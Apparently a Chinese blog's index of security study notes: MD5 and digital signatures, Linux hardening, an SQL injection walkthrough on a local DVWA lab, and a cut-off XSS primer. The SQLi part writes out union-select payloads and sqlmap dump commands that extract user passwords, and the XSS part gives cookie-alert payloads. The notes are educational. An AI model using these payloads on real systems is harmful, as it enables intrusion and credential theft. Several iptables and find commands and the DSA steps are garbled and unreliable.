Check等）进行一次MD5校验，确保文件和网站提供的一致。利用MD5算法来进行文件校验的方案被大量的应用到软件下载站、论坛数据库、系统文件安全等方面。\nMD5还广泛的应用与操作系统登录认证，如Unix、各类BSD系统的登录密码、数字签名等。Unix系统的用户密码就是MD5散列运算储存于文件系统，当用户登录时，系统就要把用户输入的密码进行MD5散列运算，在和储存在文件系统里MD5值进行比较，进而确定密码是否正确。这样的好处时文件系统没有直接明文存储密码，而是密码的MD5，而我们说过了，散列算法时不可逆的，所以基本时不可逆推算出原来的明文，即使可能存在极小可能的碰撞，但是几率太低了，基本可以忽略，这样就避免了密码的泄露，提高了安全性。\n所以现在黑客使用最多的密码破译方式就是跑字典，也即使暴力破解了。关于字典的话，一是日常收集的用做密码的字符串表，可以去网上找一些字典，另一种是用排列组合方式生成的，有一些专门的字典生成软件。先用MD5程序计算出这些字典的MD5值，然后再用目标的MD5值在这个字典里检索，但是前提是你可以搞得到目标账户的密码的MD5值。就算有了MD5值也是很低效的。所以散列密码依旧是最被广泛使用的密码技术。\n数字签名上面说了黑客有可能会修改信息和MD5散列值，已到达攻击目的。所以需要一种签名机制，它要保证所有人对文件完整性进行认证，同时又可以验证这份文件确实是发送者发的，攻击者无法伪造这个签名。数字签名（又称公钥数字签名、电子签章）是一种类似写在纸上的普通物理签名，但是用来公钥加密领域的技术实现，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，一个用于验证。\n数字签名是公算法和散列算法的结合应用。数字签名常常和散列函数在一起使用，给定一段明文M，可以计算出明文的散列值h(M)，然后将散列值进行某种加密S后，附在明文上，结构如M|S(h(M))。代表性的又RSA签名和DSA签名。\nRSA数字签名（1）密钥生成密钥生成方式即RSA密钥生成方式，可以查阅RSA公钥算法的密钥生成过程\n（2）签名过程假设需要加密和签名的信息位M，其中M在1，2，……，n-1这个范围内，H为散列函数，签名过程如下\nS=H(M)^d mod n\n（3）验证过程计算明文的散列值H(M)，同时用公钥e解密S，再比较H(M)是否和S^e mod n相同，如果相同则验证成功。\nDSA签名使用SHA散列加密函数，它的安全性也取决于散列对数的难题。选择一个1024bit的素数p，此时又一个群组Zp。选择另一个160bit的素数q，q除以p-1和q都在群组Gq中，并且群组Gq属于Zp。其中用到的散列算法是SHA-1\n（1）密钥生成1、选择p和q，条件就是上面所表达的，换成数学的表达方式就是p=zq+1，并且z属于群组Zp\n2、选择一个g，使得jz=g（mod p）成立，并且1&lt;j&lt;p\n3、在范围1，……，q-1内选择一个随机数x\n4、计算出来y=gx mod p\n5、其中的公钥就是K1=（p，q，g，y），私钥就是K2=（p，q，g，x）\n（2）签名过程1、在范围1，……，q-1内选择一个随机数r\n2、计算出来的s=（gr mod dp）mod q\n3、计算出t=((SHA-1(M)+xs)r-1) mod q\n4、将签名结果（s，t）附属在消息上\n（3）验签过程1、计算出u1=(SHA-1(M)t-1) mod q\n2、计算出u2=(st-1) mod q\n3、计算签名s1=((guqyu1)mod p)mod q\n4、比较s1于s是否相同\n","slug":"密码安全之公钥密码、散列算法、数字签名","date":"2020-03-09T07:54:15.000Z","categories_index":"学习笔记","tags_index":"网络安全,Crypto","author_index":"A1andNS"},{"id":"f8c714347e52c45826a3bbbe606ba90e","title":"Linux系统安全基础","content":"Linux系统概述1、历史Linux操作系统诞生于1991年，它是Unix的一种典型克隆系统。它是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统，继承了Unix以网络为核心的设计是想，也是一个性能稳定的多用户网络操作系统。由Linus Torvalds设计，在热心的支持者帮助下不断开发完善。开源、开放、免费是Linux的魅力所在，Linux还具有良好的可移植性。\n2、内核简介Linux是一个一体化内核系统。\n“内核”指的是一个提供硬件抽象层、磁盘及文件系统控制、多任务等功能的系统软件。一个内核不是一个完整的操作系统。一套基于Linux内核的完整操作系统叫做Linux操作系统，或是GNU/Linux。设备驱动程序开源完全访问硬件，可以在系统运行时直接装载或卸载。\n内核是一个操作系统最重要的部分，Linux内核目前也是在不断的更新。因为内核也是会有很多漏洞和缺陷的，出于安全性内核版本应该引起注意。\nLinux内核编号形式：主版本号.次版本号.修订版本号\n较小的内核隐患和安全补丁被赋予了次小数点版本号，如2.6.11.1\n在Linux的终端中，查看本机内核信息的命令为：\nuname -a\n\n加载内核模块的命令为insmod filename\n删除内核模块的命令为rmmod filename\n其中，filename为用户准备好了需要加入内核的模块文件，查看系统已经加载的内核模块如下图（比较多图里只有一部分）\n\n3、发行版本发行版本是真的挺多的，各种各样的，比较著名的3个：Fedora、SUSE、Debian。著名的Ubuntu就是Debian的下游，CentOS和Oracle Linux则是Fedora的下游。我用的Kali Linux就是基于Debian发展而来的。\n4、文件系统Linux和Windows下的文件的组织结构不用，Linux不使用磁盘分区符号来访问文件系统，而是整个文件系统表示成树状结构，Linux系统没增加一个文件系统都会将其加入到这个树中。\n操作系统文件结构的开始，只有一个单独的顶级目录结构，叫根目录。所有的一切都是从根开始，用“/”表示，并且延申到子目录。\nDOS/Windows系统下的文件系统都是按照磁盘分区的概念分类，目录存在分区上。而Linux系统则是通过“挂载“方式把所有分区都放置在”根”下的各个目录里。我虚拟机里的Kali Linux的文件结构可以看下面。\n\n还可以用tree命令来更加直观的显示文件目录的树状结构如下图。\n\n由于Ubuntu系统不自带tree命令，我的kali Linux也没有tree命令，所以可以使用apt-get install tree（kali linux）进行安装或sudo apt-get install tree进行安装。\nOpenSSH安全配置OpenSSH是安全Shell协议族（SSH）的一个免费版本。SSH协议族可以用来进行远程控件，或在计算机之间传送文件。而实现此功能的传统方式，如Telnet、RCP都是极不安全的，并且使用明文传送密码。OpenSSH提供了服务端后台程序和客户端工具，来实现机密数据，并且代替原来的类似服务。\nSSHD是一个典型的独立的守护进程，OpenSSH服务可以通过/etc/ssh/sshd_config文件配置。\n1、禁止Root用户登录只允许普通用户登录，设置如下。\n#Authentication:\nLoginGraceTime 120\nPermitRootLogin no\nStrictModes yes\n\n2、限制SSH验证重试次数超过5次Socket连接会断开，设置如下。\nMaxAuthTries 5\n3、禁止证书登录证书登录很安全，但是正常用户和权限用户都可以给系统安装一个证书到.ssh/authorized-keys文件里，随时进入系统。对此可以禁用证书登录\nPubkeyAuthenticationno\n4、使用证书替代密码认证这个与上面讲的正好相反，只允许使用key文件登录\nPasswordAuthenticationno\n5、图形窗口客户端记忆密码的问题当使用XShell、Xftp、WinSCP、SecureCRT、SecureFX等软件登录时，该软件都提供记住密码的功能，使下一吃在登录就可以不输入密码进入系统。这是很方便但是在设备丢失后，就会产生巨大的风险。可以进行如下设置。\nChallengeResponseAuthentication yes\n6、禁止SSH端口映射AllowTcpForwarding no\n7、IP地址限制如果只希望特定IP地址的用户登录主机，如果只允许192.168.1.1和192.168.1.2访问登录，可以对/etc/host.allow进行修改：\nsshd:192.168.1.1 192.168.1.2\n如果希望禁止所有人访问主机，对/etc/hosts.deny修改，如下：\nsshd:ALL\nShell安全1、.history文件通过~/.bash_history文件记录系统管理员的操作记录，定制.bash_history格式。\n（1）以Root用户登录服务器，在/etc/profile.d/下新建一个文件history_command。\n（2）编辑刚才创建的文件，写入内容。\nexport HISTFILE&#x3D;$HOME&#x2F;.bash_history\nexport HISTSIZE&#x3D;1200\nexport HISTFILESIZE&#x3D;1200\nexport HISTCONTROL&#x3D;ignoredups\nexport HISTTIMEFORMAT&#x3D;”&#39;whoami&#39; %F %T “\nshopt -s histappend\ntypeset -r HISTTIMEFORMAT\n\n（3）使用source/etc/profile.c/history_command，使其生效。\n2、执行权限以数据库为例，从安全角度考虑，需要进行如下的更改。\n#chown mysql:mysql&#x2F;usr&#x2F;bin&#x2F;mysql*\n#chown 700 &#x2F;usr&#x2F;bin&#x2F;mysql*\n\nmysql用户是DBA专用用户，其他用户将不能执行mysql等命令。\n权限管理和控制1、权限查看Linux系统中每一个文件和目录都有访问许可权限，通过其来确定谁可以以何种方式访问和操作文件或者目录。\n文件或目录的访问权限分为只读、只写、可执行3种。文件创建时，文件所有者自动拥有对该文件的读、写和可执行权限。\n-rwxrw-rw- 1 root root 24064 1月 1410:58 qq.exe为例子\n看最左边，-表示不具有该权限，r为只读，w为写，x为可执行。第一个字符如果时-则表示这是一个非目录文件，如果是d，表示是一个目录，后面的字符每3个为一组，分别表示属主、组用户、其他用户的访问权限。可以看出qq.exe是一个普通文件，属主可以读、写、可执行，而组用户只有读和写权限，其他用户也是只有读和写权限。同时，qq.exe文件的所有者是root用户，属于root组用户。\n2、管理控制可以使用chown命令来改变文件的所属用户和组，将指定文件的拥有者改为指定的用户或组。\n命令格式：chown[选项]用户或组文件，命令选项为一下选项：\n-R：递归改变指定目录及其下面的所有子目录和文件拥有者\n-v：显示chown命令所做的工作\n使用chown命令修改用户和组的如下：\n\n使用chmod命令修改文件权限可以灵活更多，它支持数字设定权限，其中，读权限r对应数字4，写权限w对应2，执行权限x对应1,chmod使用如下\n\n+x就是对所有的用户添加执行权限，使用u+x，指定文件的所有者增加执行权限，同理还用o+x，g+x。\n数字设定权限方法如下：777对应所有rwx权限，444对应所有的r权限。chmod 777 b后得到如下结果为了安全应该要尽量避免产生权限为777的文件，毕竟所有人都可以读、写、执行将会带来较大的安全威胁和风险。\n文件系统安全 Linux对于文件权限管理是完善和全面的，但是用户通常会在权限的设置上产生批漏，下面对于文件系统的权限和安全做进一步说明。\n1.锁定系统重要文件系统运维人员有时候可能会遇到通过Root用户都不能修改或删除某个文件的情况，产生这种情况的大部分原因可能是这个文件被锁定了。在Linux下锁定文件的命令是chattr,通过这个命令可以修改ext2、ext3、ext4文件系统下文件属性，但是这个命令必须有超级用户Root来执行。和这个命令对应的命令是lsattr,这个命令用来查询文件属性。通过chatr命令修改文件或目录的文件属性能够提高系统的安全性，下面简单介绍下chattr和lsattr两个命令的用法。lsattr用来查询文件属性，用法比较简单，其语法格式如下。Isattr [-RVadIpv] [文件]常用参数如下所示。-a:列出目录中的所有文件，包括以.开头的文件。-d:显示指定目录的属性。-R:以递归的方式列出目录下所有文件及子目录以及属性值。-v:显示文件或目录版本。chattr命令的语法格式如下。chattr [-RV] [-v version] [mode]文件或目录。主要参数含义如下。-R:递归修改所有的文件及子目录。-V:详细显示修改内容，并打印输出。其中，mode部分用来控制文件的属性，常用参数如下所示。+:在原有参数设定基础上，追加参数。-:在原有参数设定基础上，移除参数。=:更新为指定参数。\na:即append,设定该参数后,只能向文件中添加数据，而不能删除。常用于服务器日志安全文件，只有Root用户才能设置这个属性。c:即compresse 设定文件是否经压缩后再存储。读取时需要经过自动解压操作。i:即immutable， 设定文件不能被修改、 删除、重命名、设定链接等， 同时不能写入或新增内容。 这个参数对于文件系统的安全设置有极大帮助。s:安全删除文件或目录，即文件被删除后硬盘空间被全部收回。u:与s参数相反，当设定为u时，系统会保留其数据块以便以后能够恢复删除这个文件。这些参数中，最常用到的是a和i，参数a常用于服务器日志文件安全设定，而参数i更为严格，不允许对文件进行任何操作，即使是Root用户。在Linux系统中，如果一个用户以Root的权限登录或某个进程以Root的权限运行，那么它的使用权限就不再有任何的限制了。因此，攻击者通过远程或本地攻击手段获得了系统的Root权限将是一个灾难。 在这种情况下，文件系统将是保护系统安全的最后一道防线， 合理的属性设置可以最大限度地减小攻击者对系统的破坏程度，通过chattr命令锁定系统些重要的文件或目录，是保护文件系统安全最直接、最有效的手段。对一些重要的目录和文件可以加上“i” 属性，常见的文件和目录如下所示。\nroot@kali:~&#x2F; chattr -R +i &#x2F;bin &#x2F;boot &#x2F;lib &#x2F;sbin\nroot@kali:~&#x2F; chattr -R +I &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;include &#x2F;usr&#x2F;lib &#x2F;usr&#x2F;sbin\nroot@kali:~&#x2F; chattr +i&#x2F;etc&#x2F;passwd\nroot@kali:~&#x2F; chattr +i&#x2F;etc&#x2F;shadow\nroot@kali:~&#x2F; chattr +i&#x2F;etc&#x2F;hosts\nroot@kali:~&#x2F; chattr +i&#x2F;ect&#x2F;resolv.conf\nroot@kali:~&#x2F; chattr +i&#x2F;etc&#x2F;fstab\nroot@kali:~&#x2F; chattr +i&#x2F;ect&#x2F;sudoers\n\n对一些重要的日志文件可以加上“a”属性，如下所示。\nroot@kali:~&#x2F; chattr +a &#x2F;var&#x2F;log&#x2F;messages\nroot@kali:~&#x2F; chattr +a &#x2F;var&#x2F;log&#x2F;wtmp\n\n对重要的文件进行加锁，虽然能够提高服务器的安全性，但是也会带来一些不便。 例如，在软件的安装、升级可能需要去掉有关目录和文件的immutable属性和append-only属性，同时，对日志文件设置了append-only属性，可能会使日志轮换(logrotate)无法进行。因此，在使用chattr命令前，需要结合服务器的应用环境来权衡是否需要设置immutable属性和append-only属性。\n另外，虽然通过chattr命令修改文件属性能够提高文件系统的安全性，但是它并不适合所有的目录。chattr 命令不能保护/、/dev、 /tmp、 /var 等目录。根目录不能有不可修改属性，因为如果根目录具有不可修改属性，那么系统根本无法工作: /dev在启动时，syslog 需要删除并重新建立/dev/log套接字设备，如果设置了不可修改属性，那么可能出问题;/tmp目录会有很多应用程序和系统程序需要在这个目录下建立临时文件，也不能设置不可修改属性; /var 是系统和程序的日志目录，如果设置为不可修改属性，那么系统写日志将无法进行，所以也不能通过chattr 命令保护。\n2.文件权限检查和修改系统中如果有不正确的权限设置，可能会危及整个系统的安全，下面列举查找系统不安全权限的方法。\n (1)查找系统中任何用户都有写权限的文件或目录，查找文件，如下所示。\nroot@kali:~# find&#x2F; -type f perm -2 -0 perm -20 | xargs ls -al\n\n查找目录，如下所示。\nroot@kali:~# find &#x2F; -type d -perm -2 -o perm -20 | xargs 1s -ld\n\n(2)查找系统中所有含“s”位的程序。\nfind&#x2F;-type f-perm -4000 -o -perm -2000 -print | xargs ls -al\n\n含有“s”位权限的程序对系统安全威胁很大，通过查找系统中所有具有“s”位权限的程序，可以把某些不必要的“s”位程序去掉，这样可以防止用户滥用权限或提升权限的可能性。(3)检查系统中所有suid及sgid文件。\nfind&#x2F; -user root -perm -2000 -print -exec md5sum &#123;&#125; \\;\nfind&#x2F; -user root -perm -4000 -print -exec md5sum &#123;&#125; \\;\n\n将检查的结果保存到文件中，可在以后的系统检查中作为参考。(4)检查系统中没有属主的文件\nfind&#x2F; -nouser -o -nogroup\n\n没有属主的孤儿文件比较危险，往往成为黑客利用的工具，因此，找到这些文件后，要么删除掉，要么修改文件的属主，使其处于安全状态。\niptables配置 iptables是用来设置、维护和检查Linux内核的IP分组过滤规则的。作为Linux下的一款防火墙，它的功能十分强大，它有3个表，每个表内有规则链。(1) filter 是默认的表，包含了内建的链INPUT (处理进入的分组)、FORWARD (处理通过的分组)和OUTPUT (处理本地生成的分组)。(2)nat表被查询时表示遇到了产生新的连接的分组，由3个内建的链构成:PREROUTING(修改到来的分组）、OUIPUT (修改路由之前本地的分组) POSTROUTING (修改准备出去的分组）。(3 )mangle表用来对指定的分组进行修改。它有2个内建规则: PREROUTING (修改路由之前进入的分组)和OUTPUT (修改路由之前本地的分组）。下面简单介绍ipables的常用配置。\n1.查看iptables规则查看当前的iptables策略，使用iptables -L命令，默认查看的是flter表的内容，如下。\n\n2、设置chain策略对于filter表，默认的chain策略为ACCEPT, 可以通过以下命令修改chain 的策略。\nroot@kali:~# iptables -P INPUT DROP\nroot@kali:~# iptables -P FORWARD DROP\nroot@kali:~# iptbales -P OUTPUT DROP\n\n以上命令配置将接收、转发和发出分组均丢弃，施行比较严格的分组管理。由于接收和发分组均被设置为丢弃，当进一步配置其他规则的时候，需要注意针对INPUT和OUTPUT分别配置，当然，如果信任本机器往外发分组，上面第 3条规则可不必配置。\n3.清空已有规则可以用以下规则来清空已有的规则。\nroot@kali:~# iptables -F\n\n\n\n4.网口转发规则对于用作防火墙或网关的服务器，一个网口连接到公网，其他网口的分组转发到该网口实现内网向公网通信，假设ethO连接内网，ethl 连接公网，配置规则如下。\nroot@kali:~# iptables -A FORWARD -i eth0 -0 ethl -j ACCEPT\n\n\n\n5.端口转发规则命令将888端口的分组转发到22端口，因而通过888端口也可进行SSH连接。\nroot@kali:~# iptables -t nat A PREROUTING ptep d 192 168.1.1 dport 888 1 DNAT -to 192. 168.1.1:22\n\n6、DoS攻击防范利用拓展模块limit，还可以配置iptables规则，实现DoS攻击防范，如下：\nroot@kali:~# iptables -A INPUT -p tcp -dport 80 -m limit -limit 25&#x2F;minute --limit-burst 100 -j ACCEPT\n\n–limit 25/minute 指示每分钟限制最大连接数为25 。\n–limit-burst 100 指示当总连接数超过100时，启动limit/minute限制。\n常见的安全策略 Linux操作系统下有如下常用的安全策略。密码长度、session超时时间、删除不用的账号和组，限制Root用户直接Telnet或rlogin、SSHD登录。检查是否存在除Root之外UID为0的用户，确保Root用户的系统路径中不包含父目录，在非必要的情况下，不应包含组权限为777的目录。检查操作系统Linux用户umask设置，检查重要目录和文件的权限，禁止除Root之外的用户su操作，查找系统中任何人都有写权限的目录。查找系统中没有属主的文件，查找系统中的隐藏文件，判断日志与审计是否合规，登录超时设置，禁用不必要的服务。\n参考文献[1]网络空间安全实战基础.陈铁民.北京.2018.2\n","slug":"Linux系统安全基础","date":"2020-03-09T07:52:19.000Z","categories_index":"学习笔记","tags_index":"网络安全,Linux","author_index":"A1andNS"},{"id":"301fa19ea5e03cee262a69d587c44e7a","title":"SQL注入简单入门","content":"写在前面谈到SQL注入，那么自然和数据库有很大的关系。先说数据库，数据库大致可以分为Access数据库、MySQL数据库、SQLServer数据库、Oracle数据库等。Access数据库是比较早期的应用于Web应用的数据库。但是近几年Access数据库的使用再逐渐地减少，这是因为它不能适应大量用户的访问，而且安全性没有其他的数据库高。而现在使用的比较多的是MySQL数据库。SQLServer和Oracle在大型公司比较适用。\n1、原理SQL语言时一门解释型语言，由一个运行时组件解释代码并且执行其中的指令。Python也是一种解释型语言。\n基于解释型语言的执行方式，会产生一系列叫代码注入的漏洞，SQL就是其中的一种。攻击者只需要提交专门设计的SQL语句，向Web应用程序攻击。结果，解释器就会将这其中一部分的输入解释为程序指令来执行了，就和一开始程序员写好的代码一样。因此，SQL注入漏洞就随之形成了。\n除了语言本身的原因，SQL注入产生的另一个原因就是没有对输入或提交数据进行过滤。在编写Web应用时，由于其自主访问控制性质，程序员一般会对用户输入的信息进行一定程度上的过滤操作，过滤掉一些危险字符，如or、单引号、注释符等。但是也会存在一些经验不足的程序员忽视这个问题，从而导致过滤规则不到位，最后就导致SQL注入漏洞的出现，以至于被攻击者利用。\n2、注入分类主要由3种不同类型的注入点，它们分别是数字型、字符型和搜索型。在编写实际的web应用时，程序员会根据不同的数据类型编写不同的查询代码。\n例如：\n（“？”表示需要输入的数据）\n数字型：SELECT * FROM user WHERE id = ？\n字符型：SELECT * FROM user WHERE username = ‘?’\n搜索型：SELECT * FROM user WHERE username = ‘%?%’\n每个类型在输入数据的时候，对数据进行了一定的规范，因此，才产生了这样的划分。重点是要去区分类型。上面的这种区分知识从数据角度进行的划分，它们的注入步骤和原理都是一样的。 \n对于安全人员而言，工具仅是一种实现渗透的手段，不能过多依赖于工具的操作。因为工具也是安全人员为了简化步骤而编写出来的。对于刚刚接触的人而说，工具会很方便，但是了解原理才真正掌握了这个漏洞。工具确实很方便，感觉工具让初学者感到舒适，不过还是要学习原理的。毕竟原理才是最重要的。\n那么就开始SQL注入探索之旅了！！！这里我用的是DVWA，之前的博客由介绍过DVWA，不知道的朋友可以去查访，也可以自行查找资料。\n在DVWA里选择了low的security level，然后选择到了SQL注入模块，在输入框中输入1，然后提交，得到如下的结果。\n\n从上图中可以看出，输入一个数字后，返回了一个ID=1的查询结果。以此为例，在进行注入点判断的时候，按照一般步骤，输入数字时会考虑这是一个数字型的注入点，所以会先按照数字型的方式操作注入点。\n在其中输入1 and 1 = 1试试，结果如下：\n\n看结果可以看出ID现在是1 and 1=1，很明显，没有达到我要的效果，这里的ID不是数字型而是个字符型。所以我对注入点类型的判断就变为字符型了。\n接下来就要去判断这个注入点是否是有效的。在很多的实际操作中，某些应用程序虽然会允许这样的输入操作发生，当它在后端实际是过滤了该部分。所以不一定会由操作效果。那么就用一个经典的操作来判断注入点是否有效。\n在其中输入1‘ and ’1’=‘1结果如下：\n\n再输入1’ and ’1‘=’2，结果如下：\n这里出现了两种不同的结果，而这两种结果证明了这个注入点是有效的。and 1=1是一个永真命题，and后面的条件是永远成立的，而and 1=2正好相反，1=2是一个永假命题，and后面的条件不成立。对于web应用来说，再条件不成立的情况下就也不会将结果返回给用户，所以后者的查询结果中看不到数据。\n不同的数据库可能会有不同的操作。\nMySQl数据库允许使用联合查询方法，这样查询更加便捷。那么我们判断完注入点后，应该要判断数据表的列数，那么就输入1&#39; order by 1#。结果如下：\n\n正常显示了ID=1的数据，说明一下1&#39; order by 1#，其中的order by是根据列值查找的命令，找不到就会报错。#起到的作用是注释，这个和Python一样，注释后防止后续语句干扰。接下来继续试1&#39; order by 6#，直到确定列数。结果如下：\n\n这里就明显是报错了，找不到列值为6的列。这就说明这个数据表里不存在6列，然后继续按照这个步骤，可以从1开始往上试（直到出现报错）或者从6开始往下试（或者正常显示）。这样我就可以确定表中究竟有多少列，接下来我一个个试后，发现DVWA的security：low的表只有2列。\n知道了列数为2列之后，我们要看MySQL数据库的版本，从MySQL5.0版本开始的版本具有information_schema数据库，里面有所有数据库的数据表名和列名。我可以利用这个数据库来进行数据的检索，所以在此之前需要查看使用的MySQL数据库的版本，输入1&#39; union select version (),2#,提交，结果如下：\n\n可以看到数据库版本是5.5.53，知道了版本号，就可以使用information_schema来完成后续的操作。\n输入1&#39; union select table_name,2 from information_schema.tables where table_schema=database()#,结果如下：\n\n由此可以看出图中显示了两个表名，一个是guestbook，一个是users。但是可能没有看懂上面输入的是说明意思。不慌，这就理解说明一下，information_schema数据库中含有tables这个数据表，条件是表数据库名与database()相同，而database()正是当前查询的数据库。\n然后查询列名。\n输入1&#39; union select group_concat(column_name),2 from information_schema.columns where table_name = &#39;user&#39;#,结果如下。\n\n一共可以看到11个列名，输入语句其实与上面那句类似，就是找到那个数据表中的列名。有了这些数据，我就可以列出想要的数据了，输入1&#39; union selcet user,password from users#,结果如下：\n\n我们就可以得到用户名和密码了，这里的密码使用的都是MD5加密，可以利用MD5在线解密工具解密。\n这差不多就是手工注入的步骤。\n总结一下就是：找注入点—&gt;判断数据库的列数—&gt;查看数据库版本—&gt;获取数据库名—&gt;获取数据表名—&gt;获取数据列名—&gt;爆出数据。\n3、SQL注入工具SQL注入工具有很多，比较好用的有Pangolin和SQLMap工具。这两个工具对于初学者来说，上手难度不大。\nPangolin是一款帮助渗透测试人员进行SQL注入测试的安全工具。Pangolin和JSky都是NOSEC公司的产品。Pangolin具备友好的图形界面并支持测试几乎所有的数据库。\nSQLMap是一个自动SQL注入工具，可以执行一个广泛的数据库，管理系统后端指纹，检索DBMS数据库、username、表格、列，并列举整个DBMS信息。SQLMap提供转储数据库表以及MySQL、PostgreSQL、SQLServer服务器下载或上传任何文件并执行任意代码的能力。\n注：DBMS：Database Management System，数据库管理系统\n我一般喜欢用SQLMap，这里实在Windows环境下的演示：\n打开cmd，到sqlmap所在的目录，\n输入：python sqlmap.py -u&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=ec88uk1ch1p4872supj3vp2mj3&quot; --current-db\n\n可以看到当前的数据库名为dvwa，之后输入：\npython sqlmap.py -u&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=ec88uk1ch1p4872supj3vp2mj3&quot; -D dvwa --tables\n\n可以看到有两个表名，一个是guestbook，一个是users。这个和之前的手工注入效果是一样的。\n接下来继续，我输入python sqlmap.py -u&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=ec88uk1ch1p4872supj3vp2mj3&quot; -D dvwa -T users --columns\n\n一共有8个列名，之后就dump数据就ok了。之前手工注入的时候多显示了 3个列，不过问题不大，输入python sqlmap.py -u&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=ec88uk1ch1p4872supj3vp2mj3&quot; -D dvwa -T users -C user,password --dump\n\n这样就可以得到我们想要的账号和密码，这里的密码的MD5值也被解出了。SQLMap自带字典可以用来破解比较简单的密码。从操作上来看的话，SQLMap是一款很不错的自动注入工具，但是在安全级别较高的应用中，SQLMap的使用还是比较有限的。不过对于新手而言确实是很友好的工具。我一开始接触SQL注入，就使用了这一款工具，感觉确实很不错，新手也很容易上手，就是真正来说还是要会手工注入比较好，贴近原理。\n4、预防SQL注入对于服务器层面的防范，应该保证生产环境的Webshelll是关闭错误信息的。例如，PHP生产环境的配置php.ini中的display_error是off，这样就可以关闭服务器的错误提示。关闭了错误提示是有利于混淆视听的，可以一定程度上干扰攻击者，另外可以从编码方面去预防SQL注入。\n最好是使用预编译语句来防御SQL注入，就是使用预编译语句绑定变量。\n例如在JSP中使用的预编译的SQL语句。\nString sql&#x3D;&quot;SELECT * FROM users where username &#x3D; ?&quot;;\nPreparedStatement pstmt &#x3D; connection. prepareStatement();\npstmt.setString(1,admin);\n\n?处与后面的输入的变量相互绑定，之后攻击者如果使用and 1=1之类的语句，应用程序会将整个部分当作是username来进行检索数据库，而不会造成修改语义的问题。\n还可以检查变量类型和格式。如果要求用户输入的数据是整型的，那么就可以在查询数据库之前检查一下获取到的变量是否为整型，如果不是整型就要重新校正。还有就是一些比较特殊的格式类型，如日期、时间、邮件等格式。总体而言，如果变量有固定的格式，在SQL语句执行前，就应该严格地按照要求去检查，可以很大程度预防SQL注入攻击。\n还要一种方法就是过滤一些特殊符号。在SQL注入时，往往需要一些特殊的符号帮助我们编写语句，如&#39;、#、&quot;等。可以将这些符号都进行转义处理或使用正则表达式过滤掉。\n除了编码层面的预防，还需要做到数据库层面的权限管理，尽量减少在数据库中使用Root权限直接查询的次数。如果有多个应用程序使用同一个数据库，那么数据库应该分配好每个应用程序的权限。\n参考文献[1]陈铁明.网络空间安全实战基础:第一版.北京:人民邮电出版社,2018\n","slug":"SQL注入简单入门","date":"2020-03-09T07:51:08.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,SQL注入","author_index":"A1andNS"},{"id":"26ba6c78face14f329da4d0dd48531b1","title":"XSS跨站入门基础知识","content":"之前写的SQL主要时针对服务器端，通过构造SQL命令提交，以达到脱库或其他目的。今天要说的这个XSS也是一个非常著名的Web漏洞。XSS（Cross Site Scripting）的全称是跨站脚本攻击，之所以叫XSS，是想与Web中的另一个层叠样式表CSS区分。该攻击主要是在网页中嵌入JavaScript脚本代码，当用户访问此网页时，脚本就会在浏览器中被执行，从而达到攻击目的。\n在XSS中，一般有3个角色，分别是：攻击者、目标服务器、受害者的浏览器。\n由于有些服务器没有对用户输入进行有效的安全验证，从而导致攻击者可以通过正常的书写方式并带有部分的HTML恶意脚本代码的方法进行攻击，当受害者的浏览器访问目标服务器的时候，由于对目标服务器的信任，这段恶意代码的执行不会受到什么影响，从而构成了XSS攻击。\n例如我们使用一个简单的脚本：\n&lt;script&gt;alert(document.cookie);&lt;&#x2F;script&gt;\n\n这个语句的意识就是以警告框的形式将用户访问网站的Cookie输出。如果攻击者向一个网站输入数据时，在正常数据后面带上这一段代码，那么那个网站的源码将变成如下情况。\n&lt;html>\n…\n\ttest&lt;script>alert(document.cookie)&lt;/script>\n…\n&lt;/html>\n\n这个时候如果受害者访问这个网页时就会弹出它的Cookie信息，类似下面这样子（下图是用console控制台做出来的效果，并未进行真实攻击）\n\n这里只是XSS的一个简单的小演示，只要愿意，黑客就可以向里面插入任意的代码，甚至写一个js文件代码，以引用的形式插入进入网页。下面详细说说XSS攻击类型。\n1、反射型XSS反射型XSS又叫做非持久型XSS。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式是一次性的。攻击者通过电子邮件等方式将包含注入脚本的恶意链接发给受害者，当受害者单击该链接时，注入脚本就会被传输到目标服务器上，然后目标服务器将注入脚本“反射”到受害人的浏览器上，从而在该浏览器上执行了这段脚本。\n例如，攻击者将如下链接发送给受害者: http://www.example.com/search.asp?input=&lt;script&gt;alert(document. cookie);&lt;/script&gt;当受害者单击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在单击链接的时候才产生作用，这也是它被称为非持久型XSS的原因。\n2、存储型XSS存储型XSS又叫做持久型XSS，看名字其实很容易联想到，既然是存储的自然就持久的，之前的反射一下自然就是非持久型。存储也是他和反射型最大的区别，攻击脚本将被永远存放在目标服务器的数据库和文件中。这种攻击比较常见于论坛，攻击者在发帖的时候，将恶意脚本连同正常的信息一起注入到帖子的内容中。随着帖子被论坛服务器存储下来，恶意脚本也永远地存放在论坛服务器的后端存储器里了。当其他用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本就会在它们的浏览器中得到运行，从而收到攻击。\n可以看到的，存储型XSS的攻击方式可以把恶意带啊吗永久地嵌入一个网页之中，所有访问这个页面的人都会称为受害者。如果我们对待不明链接足够谨慎，那么反射型XSS攻击将没有多大作用，因为我们根本就不会去点击它。而存储型则不一样了，由于它注入的往往是一些受信任的页面，因此无论多么小心，都难免会受到攻击。因此，存储型XSS更加具有隐蔽性，带来的危害是更大的，除非服务器可以智能地阻止注入，否则任何人都有可